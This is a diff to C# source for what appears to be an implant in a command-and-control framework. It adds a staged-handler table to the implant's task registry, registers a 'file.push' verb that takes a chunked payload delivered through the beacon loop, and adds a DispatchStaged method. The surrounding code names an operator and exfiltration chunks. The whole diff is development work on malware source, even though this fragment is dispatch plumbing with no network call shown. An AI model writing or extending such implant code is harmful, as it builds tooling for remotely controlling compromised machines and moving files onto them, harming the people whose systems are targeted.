@@ -87,11 +87,20 @@ internal sealed class HandlerRegistry
     // Verb (case-insensitive) -> the handler that runs it.
     private readonly Dictionary<string, ICapabilityHandler> _byVerb;
 
+    // Verb (case-insensitive) -> the staged handler that runs it (the typed
+    // arm, architecture.md Sec 10): same verb namespace, different input
+    // shape -- the reassembled chunk run the beacon loop demanded, alongside
+    // the arguments string. Sparse by design: only the verbs whose grammar
+    // outgrew the string register here.
+    private readonly Dictionary<string, Func<string, byte[], (TaskOutcome Outcome, string Output)>> _stagedByVerb;
+
     // The registered verbs in registration order, deduplicated. This is the
     // compiled handler set the advertised capability set derives from.
     private readonly IReadOnlyList<string> _verbs;
 
-    private HandlerRegistry(IReadOnlyList<ICapabilityHandler> handlers)
+    private HandlerRegistry(
+        IReadOnlyList<ICapabilityHandler> handlers,
+        IReadOnlyList<(string Verb, Func<string, byte[], (TaskOutcome Outcome, string Output)> Handle)> staged)
     {
         var byVerb = new Dictionary<string, ICapabilityHandler>(handlers.Count, StringComparer.OrdinalIgnoreCase);
         var verbs = new List<string>(handlers.Count);
@@ -109,6 +118,10 @@ internal sealed class HandlerRegistry
             verbs.Add(handler.Verb);
         }
         _byVerb = byVerb;
+        _stagedByVerb = staged.ToDictionary(
+            pair => pair.Verb,
+            pair => pair.Handle,
+            StringComparer.OrdinalIgnoreCase);
         _verbs = verbs;
     }
 
@@ -144,7 +157,15 @@ internal sealed class HandlerRegistry
         };
         if (additional is not null)
             handlers.AddRange(additional);
-        return new HandlerRegistry(handlers);
+
+        // The staged registrations (architecture.md Sec 10, the typed arm):
+        // file.push is the verb whose grammar outgrew the arguments string --
+        // its bulk payload arrives as the chunk run the beacon loop demands.
+        var staged = new List<(string Verb, Func<string, byte[], (TaskOutcome Outcome, string Output)> Handle)>
+        {
+            ("file.push", (args, data) => Files.PushStaged(args, data)),
+        };
+        return new HandlerRegistry(handlers, staged);
     }
 
     /// <summary>
@@ -194,5 +215,19 @@ internal sealed class HandlerRegistry
             return (result.Outcome, result.Output, result.Chunks);
         }
         return (TaskOutcome.Failed, "unknown verb: " + verb, Array.Empty<ExfilChunk>());
+    }
+
+    /// <summary>
+    /// Routes a staged task (architecture.md Sec 10, the typed arm) to the
+    /// verb's registered staged handler: the arguments string plus the
+    /// reassembled payload the beacon loop demanded. A verb with no staged
+    /// registration reports Failed with a clear message -- the fallback an
+    /// implant that never opted into the arm owes its operator.
+    /// </summary>
+    public (TaskOutcome Outcome, string Output) DispatchStaged(string verb, string arguments, byte[] data)
+    {
+        if (_stagedByVerb.TryGetValue(verb, out var handle))
+            return handle(arguments, data);
+        return (TaskOutcome.Failed, "verb does not accept a staged payload: " + verb);
     }
 }
